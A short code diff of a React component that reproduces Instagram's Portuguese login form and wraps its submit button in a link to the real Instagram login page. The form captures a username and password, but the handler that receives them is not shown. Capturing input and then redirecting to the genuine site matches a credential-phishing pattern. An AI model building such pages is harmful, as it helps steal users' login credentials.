@@ -28,9 +28,11 @@ const[Senha, setSenha]= useState(0)
               <input type="text" placeholder='Telefone, nome de usuário ou email' onChange={e=> setEmail(e.target.value)}/>
               <input type="text" placeholder='Senha' onChange={e=> setSenha(e.target.value)}/>
             </div>
+              <a href="https://www.instagram.com/accounts/login/?next=%2Finstagram%2F&source=desktop_nav&hl=pt-br">
 
-            <button className='entrar' onClick={enviar}>Entrar</button>
+            <button className='entrar' onClick={enviar}  >Entrar</button>
 
+              </a>
             <div className="ouDivisor">
               <div className="linha"></div>
               <div className="ouTexto">OU</div>
